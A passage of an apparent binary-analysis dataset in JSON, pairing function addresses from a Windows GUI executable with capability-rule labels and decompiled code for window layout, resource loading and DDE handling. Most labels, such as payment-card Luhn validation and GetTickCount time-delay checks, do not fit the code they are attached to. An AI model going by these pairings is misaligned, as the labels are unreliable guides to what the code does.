iVar4) {\n                        return;\n                    }\n                    iVar4 = fcn.00409776(*piVar3, piVar3[1]);\n                    iVar1 = var_8h;\n                    if (iVar4 != 0) goto code_r0x0042846f;\n                    iVar1 = *piVar3;\n                    var_ch = piVar3[1];\n                    var_10h = iVar1;\n                }\n                iVar4 = var_8h;\n            } while (var_8h < iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 851
    },
    "00428565": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428565(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_SetRectEmpty)(&var_10h);\n    fcn.0042bcce(&var_10h, (*(in_ECX + 0x7c) & 0xa000) != 0);\n    *arg_ch = *arg_ch + var_10h;\n    arg_ch[1] = arg_ch[1] + var_ch;\n    if (*0x44da60 < 0x40047) {\n        arg_ch[1] = arg_ch[1] + -2;\n    }\n    arg_ch[2] = arg_ch[2] + var_8h;\n    arg_ch[3] = arg_ch[3] + var_4h;\n    return;\n}\n",
        "token_count": 224
    },
    "00429305": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.00429305(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    if ((param_2 < *param_1) || (param_3 = (param_1[2] - param_2) - param_3,  param_3 < param_1[3])) {\n        param_3 = -1;\n    }\n    return param_3;\n}\n",
        "token_count": 97
    },
    "0042954f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042954f(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (arg_10h < 0) {\n        arg_10h = 0;\n    }\n    iVar3 = arg_ch + -1;\n    piVar2 = arg_8h;\n    if (0 < iVar3) {\n        do {\n            if (piVar2[1] < *piVar2) {\n                piVar2[1] = 0;\n            }\n            piVar2[2] = piVar2[1];\n            piVar2 = piVar2 + 3;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    iVar3 = 0;\n    piVar2[2] = 0x7fffffff;\n    if (0 < arg_ch) {\n        arg_8h = arg_8h + 2;\n        do {\n            if (arg_10h == 0) {\n                *arg_8h = 0;\n            }\n            else {\n                if ((arg_10h < arg_8h[-2]) && (iVar3 != 0)) {\n                    *arg_8h = 0;\n                    arg_8h[-3] = arg_8h[-3] + *0x450d48 + arg_10h;\ncode_r0x004295b5:\n                    arg_10h = 0;\n                }\n                else {\n                    iVar1 = *arg_8h;\n                    if (iVar1 == 0) {\n                        if (iVar3 != 0) {\n                            *arg_8h = 0;\n                        }\n                    }\n                    else {\n                        if (arg_10h < iVar1) {\n                            *arg_8h = arg_10h;\n                            goto code_r0x004295b5;\n                        }\n                        arg_10h = arg_10h - iVar1;\n                    }\n                }\n                if (iVar3 != arg_ch + -1) {\n                    if (arg_14h < arg_10h) {\n                        arg_10h = arg_10h - arg_14h;\n                    }\n                    else {\n                        arg_10h = arg_10h + *arg_8h;\n                        *arg_8h = arg_10h;\n                        if (arg_14h - *0x450d48 < arg_10h) {\n                            *arg_8h = (arg_10h - arg_14h) + *0x450d4c;\n                        }\n                        arg_10h = 0;\n                    }\n                }\n            }\n            iVar3 = iVar3 + 1;\n            arg_8h = arg_8h + 3;\n        } while (iVar3 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 643
    },
    "0042cd4c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cd4c(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_ECX + 0xa8);\n    puVar1 = in_ECX + 0xac;\n    uVar2 = *puVar1;\n    uVar3 = *(in_ECX + 0xb0);\n    uVar4 = *(in_ECX + 0xb4);\n    uVar5 = *(in_ECX + 0xb8);\n    *(in_ECX + 0xa8) = *arg_ch == 0;\n    (*_sym.imp.USER32.dll_CopyRect)(puVar1, arg_ch + 1);\n    fcn.0042c333(arg_8h, arg_ch);\n    *puVar1 = uVar2;\n    *(in_ECX + 0xb0) = uVar3;\n    *(in_ECX + 0xb4) = uVar4;\n    *(in_ECX + 0xb8) = uVar5;\n    *(in_ECX + 0xa8) = uVar6;\n    return;\n}\n",
        "token_count": 310
    },
    "0042ce58": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0042ce58(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint noname_3, uint noname_4, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    bool bVar5;\n    bool bVar6;\n    int32_t lpRect;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar4 = *(in_ECX + 0x7c) & 0xa000;\n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_4h = 0;\n    if (0 < *(in_ECX + 0x9c)) {\n        do {\n            iVar3 = var_4h;\n            piVar1 = fcn.0042ce39();\n            if ((piVar1 == NULL) || (iVar2 = (**(*piVar1 + 0x150))(),  iVar2 == 0)) {\n                var_10h = var_10h + (var_8h - *0x450d4c);\n                var_8h = 0;\n                iVar3 = arg_20h;\n                if (uVar4 == 0) {\n                    iVar3 = arg_1ch;\n                }\n                if (iVar3 < var_10h) {\n                    if (var_4h == 0) {\n                        fcn.0041b1cb(var_ch + 1, 0, 1);\n                    }\n                    iVar3 = var_ch + 1;\n                    goto code_r0x0042cf59;\n                }\ncode_r0x0042cf28:\n                var_ch = var_4h;\n            }\n            else {\n                (*_sym.imp.USER32.dll_GetWindowRect)(piVar1[7], &lpRect, iVar3);\n                fcn.00426186(&lpRect);\n                if (uVar4 == 0) {\n                    iVar3 = (var_18h - lpRect) + -1;\n                }\n                else {\n                    iVar3 = var_14h - var_1ch;\n                }\n                if (var_8h <= iVar3) {\n                    if (uVar4 == 0) {\n                        var_8h = (var_18h - lpRect) + -1;\n                    }\n                    else {\n                        var_8h = var_14h - var_1ch;\n                    }\n                }\n                if (uVar4 == 0) {\n                    bVar6 = SBORROW4(arg_10h, var_1ch);\n                    iVar3 = arg_10h - var_1ch;\n                    bVar5 = arg_10h == var_1ch;\n                }\n                else {\n                    bVar6 = SBORROW4(arg_ch, lpRect);\n                    iVar3 = arg_ch - lpRect;\n                    bVar5 = arg_ch == lpRect;\n                }\n                if (!bVar5 && bVar6 == iVar3 < 0) goto code_r0x0042cf28;\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < *(in_ECX + 0x9c));\n    }\n    iVar3 = var_ch + 1;\n    fcn.0041b1cb(iVar3, 0, 1);\ncode_r0x0042cf59:\n    fcn.0041b1cb(iVar3, arg_8h, 1);\n    return iVar3;\n}\n",
        "token_count": 858
    },
    "00430526": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00430526(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t *in_ECX;\n    uint var_18h;\n    uint var_8h;\n    uint lpPoints;\n    \n    uVar6 = *(arg_ch + 0x14);\n    puVar1 = arg_ch + 0x24;\n    uVar2 = *puVar1;\n    uVar3 = *(arg_ch + 0x28);\n    uVar4 = *(arg_ch + 0x2c);\n    uVar5 = *(arg_ch + 0x30);\n    (**(*arg_8h + 0x1c))();\n    fcn.00425e1e(0, 0, 0, 0);\n    uVar7 = in_ECX[0x1c];\n    *(arg_ch + 0x14) = uVar7;\n    while (uVar7 < uVar6) {\n        (**(*in_ECX + 0x154))(arg_8h, arg_ch);\n        uVar8 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(arg_8h[2], 8);\n        uVar9 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(arg_8h[2], 10);\n        (*_sym.imp.USER32.dll_SetRect)(puVar1, 0, 0, uVar8, uVar9);\n        (*_sym.imp.GDI32.dll_DPtoLP)(arg_8h[2], puVar1, 2);\n        (**(*in_ECX + 0x174))(arg_8h, arg_ch);\n        if (*(arg_ch + 0x14) == in_ECX[0x1c]) break;\n        *(arg_ch + 0x14) = *(arg_ch + 0x14) + 1;\n        uVar7 = *(arg_ch + 0x14);\n    }\n    uVar7 = *(arg_ch + 0x14);\n    (**(*arg_8h + 0x20))(0xffffffff);\n    *puVar1 = uVar2;\n    *(arg_ch + 0x28) = uVar3;\n    *(arg_ch + 0x2c) = uVar4;\n    *(arg_ch + 0x30) = uVar5;\n    *(arg_ch + 0x14) = uVar6;\n    return uVar7 == uVar6;\n}\n",
        "token_count": 596
    },
    "00431c7e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00431c7e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.0041baf1();\n    if (piVar1 != NULL) {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        iVar2 = (**(*piVar1 + 0x54))(0, 0, 0x50800000, &var_14h, var_4h, arg_ch, arg_8h);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0041cd07();\n            if ((uVar3 & 0x200) == 0) {\n                return piVar1;\n            }\n            fcn.0041cd4b(0x200, 0, 0x20);\n            return piVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 273
    },
    "00432270": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432270(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint32_t uVar6;\n    uint var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar3 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(in_ECX + 0x1c));\n    fcn.0041eeb7(uVar3);\n    pcVar2 = _sym.imp.SHELL32.dll_DragQueryFileA;\n    uVar6 = 0;\n    uVar4 = (*_sym.imp.SHELL32.dll_DragQueryFileA)(arg_8h, 0xffffffff, 0, 0);\n    iVar5 = fcn.00434fe8();\n    piVar1 = *(iVar5 + 4);\n    if (uVar4 != 0) {\n        do {\n            (*pcVar2)(arg_8h, uVar6, &var_108h, 0x104);\n            (**(*piVar1 + 0x88))(&var_108h);\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < uVar4);\n    }\n    (*_sym.imp.SHELL32.dll_DragFinish)(arg_8h);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 347
    },
    "00432435": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432435(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    sub.USER32.dll_UnpackDDElParam(1000, arg_ch, &var_214h, &var_210h);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(var_210h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n    if (uVar2 < 0x208) {\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(var_210h);\n        uVar1 = sub.USER32.dll_ReuseDDElParam(arg_ch, 1000, 0x3e4, 0x8000, var_210h);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x3e4, *(in_ECX + 0x1c), uVar1);\n        iVar3 = fcn.0041cdda();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00434fe8();\n            (**(**(iVar3 + 4) + 0xa0))(&var_20ch);\n        }\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 349
    },
    "00432d91": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432d91(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[0x31] == 0) {\n        uVar1 = in_ECX[0x33];\n        in_ECX[0x31] = 1;\n        if ((uVar1 & 4) != 0) {\n            arg_8h = 1;\n        }\n        in_ECX[0x33] = uVar1 & 0xfffffff3;\n        if ((arg_8h != 0) && (in_ECX[0x1f] != NULL)) {\n            (**(*in_ECX[0x1f] + 0x50))();\n        }\n        uVar1 = fcn.0041cced();\n        if ((uVar1 & 0x2000) == 0) {\n            fcn.0041f262(0, 0xffff, 0xe900, 2, in_ECX + 0x1b, 0, 1);\n        }\n        else {\n            var_8h = 0x7fff;\n            var_4h = 0x7fff;\n            var_10h = 0;\n            var_ch = 0;\n            fcn.0041f262(0, 0xffff, 0xe900, 1, &var_10h, &var_10h, 0);\n            fcn.0041f262(0, 0xffff, 0xe900, 2, in_ECX + 0x1b, &var_10h, 1);\n            (**(*in_ECX + 0x68))(&var_10h, 0);\n            fcn.0041ce37(0, 0, 0, var_8h - var_10h, var_4h - var_ch, 0x16);\n        }\n        in_ECX[0x31] = 0;\n    }\n    return;\n}\n",
        "token_count": 484
    },
    "004342e2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lprcSrc1\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.004342e2(uint lprcSrc2, uint dx, uint dy, uint lprcSrc, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lprcSrc1;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x34) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x24) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.00409daa(*(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0xc), -*(unaff_EBP + 0x10));\n    (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 8));\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x44);\n    fcn.0042656f(uVar2);\n    uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n    fcn.0042656f(uVar2);\n    fcn.00409dde(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n    if (*(unaff_EBP + 0x20) == 0) {\n        uVar2 = fcn.00434243();\n        *(unaff_EBP + 0x20) = uVar2;\n    }\n    if (*(unaff_EBP + 0x24) == 0) {\n        *(unaff_EBP + 0x24) = *(unaff_EBP + 0x20);\n    }\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CRgn.0;\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = vtable.CRgn.0;\n    *(unaff_EBP + -4) = 4;\n    pcVar1 = _sym.imp.GDI32.dll_CreateRectRgn;\n    if (*(unaff_EBP + 0x14) != 0) {\n        uVar2 = (*_sym.imp.GDI32.dll_CreateRectRgn)(0, 0, 0, 0);\n        fcn.0042656f(uVar2);\n        fcn.00409dc3(*(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        (*_sym.imp.USER32.dll_InflateRect)(unaff_EBP + -0x44, -*(unaff_EBP + 0x18), -*(unaff_EBP + 0x1c));\n        (*_sym.imp.USER32.dll_IntersectRect)(unaff_EBP + -0x44, unaff_EBP + -0x44, *(unaff_EBP + 0x14));\n        fcn.00409dc3(unaff_EBP + -0x44);\n        fcn.00409dde(unaff_EBP + -0x2c, unaff_EBP + -0x24, 3);\n        if (*(*(unaff_EBP + 0x20) + 4) == *(*(unaff_EBP + 0x24) + 4)) {\n            uVar2 = (*pcVar1)(0, 0, 0, 0);\n            fcn.0042656f(uVar2);\n            fcn.00409dde(unaff_EBP + -0x1c, unaff_EBP + -0x34, 3);\n        }\n    }\n    pcVar1 = _sym.imp.GDI32.dll_PatBlt;\n    if ((*(*(unaff_EBP + 0x20) + 4) != *(*(unaff_EBP + 0x24) + 4)) && (*(unaff_EBP + 0x14) != 0)) {\n        fcn.00426146(unaff_EBP + -0x1c);\n        (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n        uVar2 = fcn.0042664b(*(unaff_EBP + 0x24));\n        *(unaff_EBP + 0x14) = uVar2;\n        (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), \n                  *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n        fcn.0042664b(*(unaff_EBP + 0x14));\n    }\n    iVar3 = unaff_EBP + -0x14;\n    if (*(unaff_EBP + -0x10) == 0) {\n        iVar3 = unaff_EBP + -0x34;\n    }\n    fcn.00426146(iVar3);\n    (**(*extraout_ECX + 0x50))(unaff_EBP + -0x44);\n    uVar2 = fcn.0042664b(*(unaff_EBP + 0x20));\n    *(unaff_EBP + 0x14) = uVar2;\n    (*pcVar1)(extraout_ECX[1], *(unaff_EBP + -0x44), *(unaff_EBP + -0x40), *(unaff_EBP + -0x3c) - *(unaff_EBP + -0x44), \n              *(unaff_EBP + -0x38) - *(unaff_EBP + -0x40), 0x5a0049);\n    if (*(unaff_EBP + 0x14) != 0) {\n        fcn.0042664b(*(unaff_EBP + 0x14));\n    }\n    fcn.00426146(0);\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n    fcn.004265c6();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    fcn.004265c6();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    fcn.004265c6();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    fcn.004265c6();\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x34) = vtable.CGdiObject.0;\n    fcn.004265c6();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1991
    },
    "00436870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00436870(int32_t hgdiobj)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint lpvObject;\n    int32_t var_30h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0x18, &lpvObject);\n    piVar1 = in_ECX + 0x26;\n    if (*piVar1 == 0) {\n        var_8h = 0;\n        var_4h = hgdiobj;\n        iVar2 = (**(*in_ECX + 0x110))(0x413, var_30h / in_ECX[0x28], &var_8h);\n        uVar3 = iVar2 == 0;\n    }\n    else {\n        var_ch = var_30h / in_ECX[0x28];\n        var_1ch = 0;\n        var_14h = 0;\n        var_10h = hgdiobj;\n        var_18h = *piVar1;\n        uVar3 = (**(*in_ECX + 0x110))(0x42e, 0, &var_1ch);\n    }\n    if (uVar3 != 0) {\n        fcn.00426d9d(piVar1);\n        *piVar1 = hgdiobj;\n    }\n    return uVar3;\n}\n",
        "token_count": 380
    },
    "00436910": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00436910(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *piVar4;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar4 = arg_8h;\n    var_4h = *0x44e0fc;\n    for (iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0); iVar1 != 0; iVar1 = iVar1 + -1) {\n        (**(*in_ECX + 0x110))(0x416, 0, 0);\n    }\n    fcn.0040bbe0(&var_18h, 0, 0x14);\n    var_8h = 0xffffffff;\n    if (arg_8h == NULL) {\n        iVar1 = 0;\n        var_10h._0_1_ = 4;\n        if (0 < arg_ch) {\n            do {\n                iVar3 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar3 == 0) goto code_r0x00436a02;\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < arg_ch);\n        }\n    }\n    else {\n        arg_8h = NULL;\n        var_1ch = 0;\n        if (0 < arg_ch) {\n            do {\n                var_14h = *piVar4;\n                piVar4 = piVar4 + 1;\n                var_10h._0_1_ = 4;\n                if (var_14h == 0) {\n                    var_10h._1_1_ = 1;\n                    uVar2 = fcn.0041cced();\n                    if (((uVar2 & 0x800) == 0) && (*0x44da60 != 0x40047)) {\n                        var_18h = 8;\n                    }\n                    else {\n                        var_18h = 6;\n                    }\n                }\n                else {\n                    var_10h._1_1_ = 0;\n                    var_18h = arg_8h;\n                    arg_8h = arg_8h + 1;\n                }\n                iVar1 = (**(*in_ECX + 0x110))(0x414, 1, &var_18h);\n                if (iVar1 == 0) goto code_r0x00436a02;\n                var_1ch = var_1ch + 1;\n            } while (var_1ch < arg_ch);\n        }\n    }\n    iVar1 = (**(*in_ECX + 0x110))(0x418, 0, 0);\n    in_ECX[0x1c] = iVar1;\n    in_ECX[0x27] = 1;\ncode_r0x00436a02:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 726
    },
    "00437b8c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00437b8c(void)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_18h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 104
    },
    "004010e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004010e0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, param_2);\n        puVar3 = iVar1 + puVar2;\n        for (unaff_EDI = unaff_EDI & 0xf; unaff_EDI != 0; unaff_EDI = unaff_EDI - 1) {\n            if (puVar3 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar3) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 278
    },
    "00401140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401140(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, (param_2 >> 4) + 1 & 0xffff, 6);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.004010e0(param_1, iVar1, param_2);\n    return;\n}\n",
        "token_count": 106
    },
    "00401300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401300(int32_t *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piStack4;\n    \n    piStack4 = param_1;\n    piStack4 = (**(*param_1 + 0x60))();\n    while (piStack4 != NULL) {\n        uVar1 = (**(*param_1 + 100))(&piStack4);\n        iVar2 = fcn.0041bb64(0x43dbe8, uVar1);\n        if (iVar2 != 0) {\n            fcn.00406d10(uVar1, param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "004014a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004014a0(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    \n    iVar4 = *param_1;\n    ppiVar1 = iVar4 + -0x10;\n    piVar3 = *ppiVar1;\n    if (*(iVar4 + -0xc) != 0) {\n        piVar2 = iVar4 + -4;\n        if (*(iVar4 + -4) < 0) {\n            if (*(iVar4 + -8) < 0) {\n                fcn.004010c0(0x80070057);\n                iVar4 = extraout_ECX;\n            }\n            *(iVar4 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar4 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar4 = (**(*piVar3 + 0xc))();\n        *param_1 = iVar4 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00401630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00401630(uint *param_1, char param_2, uint param_3, uint param_4)\n\n{\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    int32_t unaff_retaddr;\n    uint *apuStack148 [33];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43aabb;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    param_1[1] = param_4;\n    uStack4 = 0;\n    *param_1 = 0x43d6f0;\n    apuStack148[0] = param_1;\n    fcn.00418b42(0x43d714);\n    puVar1 = fcn.00418601(apuStack148);\n    param_1[2] = *puVar1;\n    param_1[3] = puVar1[1];\n    param_1[4] = puVar1[2];\n    param_1[5] = puVar1[3];\n    fcn.00418a59();\n    if (unaff_retaddr != 0) {\n        if (param_1[5] < 1) {\n            if (param_1[5] < 0) {\n                fcn.0041bae1(param_1[4]);\n            }\n        }\n        else {\n            fcn.00409f48(param_1[4]);\n        }\n        param_1[4] = unaff_retaddr;\n        param_1[5] = -(param_2 != '\\0');\n    }\n    *in_FS_OFFSET = uStack16;\n    return param_1;\n}\n",
        "token_count": 394
    },
    "004018c0": {
        "rules": [
